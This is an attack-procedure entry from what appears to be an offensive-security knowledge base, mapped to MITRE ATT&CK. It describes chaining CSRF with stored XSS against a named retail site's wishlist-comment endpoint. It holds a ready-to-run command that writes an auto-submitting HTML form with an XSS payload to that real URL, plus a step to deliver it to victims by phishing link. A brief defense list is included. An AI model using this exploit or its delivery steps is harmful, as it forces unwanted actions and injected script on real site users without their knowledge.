---
id: proc-uuid-005
tags:
  - csrf-poc
  - form-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/csrf-poc-html]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:43.165Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft and Deliver CSRF PoC for XSS Injection

## Summary

This procedure creates an HTML form that auto-submits the XSS payload to the vulnerable endpoint, exploiting the lack of CSRF protection to inject into the victim's wishlist.

## Description

Without a CSRF token, any authenticated user can be tricked into submitting via a hidden form. The PoC uses the captured :id and URL-encodes the payload. Delivery via email/link; results in stored XSS for the victim.

## Requirements

1. Captured :id
2. Victim's authenticated session (tricked click)
3. HTML hosting capability

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on POST endpoints
- SameSite cookies for session
- Monitor cross-origin requests

## Objectives

1. Force payload submission
2. Add malicious comment to victim
3. Elevate self-XSS to reflected

## Instructions

### Step 1: Generate HTML PoC

**Context**: Build the form.

**Command** ([[commands/csrf-poc-html]]):
```bash
echo '<html><body><form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/[ID]" method="POST"><input type="hidden" name="wishlistComment" value="</textarea><img src=x onerror=alert(1)>"/><input type="submit" value="Submit request"/></form><script>document.forms[0].submit();</script></body></html>' > csrf_poc.html
```

> Replace [ID]; auto-submit via JS.

### Step 2: Deliver to Victim

**Context**: Host and lure.

**Command**:
```bash
# Serve file via local server or phishing link
```

> Victim loads, form submits silently.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used

- [[commands/csrf-poc-html]]

## Tools Used


## Tags

- csrf-poc
- form-injection
